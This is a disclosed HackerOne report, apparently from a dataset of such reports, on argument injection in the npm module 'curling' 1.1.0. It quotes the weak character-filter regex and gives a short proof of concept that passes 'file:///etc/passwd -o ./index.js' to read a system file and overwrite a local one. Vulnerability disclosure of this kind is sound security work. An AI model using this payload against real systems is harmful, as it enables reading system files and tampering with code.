---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '973386'
original_report_id: '973386'
title: '[curling] Remote Code Execution'
weakness: Command Injection - Generic
team_handle: nodejs-ecosystem
created_at: '2020-09-02T18:05:45.763Z'
disclosed_at: '2021-01-14T08:40:27.267Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
asset_identifier: Other module
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- command-injection-generic
---

# [curling] Remote Code Execution

## Metadata

- HackerOne Report ID: 973386
- Weakness: Command Injection - Generic
- Program: nodejs-ecosystem
- Disclosed At: 2021-01-14T08:40:27.267Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

I would like to report `RCE` in `curling`
I can bypass the security check for special characters, read / overwrite file

# Module

**module name:** curling
**version:** 1.1.0
**npm page:** `https://www.npmjs.com/package/curling`

## Module Description

A node wrapper for curl with a very simple api.

## Module Stats

[156] weekly downloads

# Vulnerability

## Vulnerability Description

The regular expression does not perform proper validation and, when combined with curl, leads to disastrous consequences:
```javascript
/[`$&{}[;|]/g.test(command)
```

## Steps To Reproduce:

- Run `npm i curling`

- Create and run the following POC index.js:

```javascript
const curling = require('curling');

curling.run('file:///etc/passwd -o ./index.js', function(d, payload){console.log(payload)});
```

- The exploit worked and overwritten the file - `index.js`

{F973903}

## Patch

Regular expression needs improvement

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Command Injection on `curling` module via insecure command

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
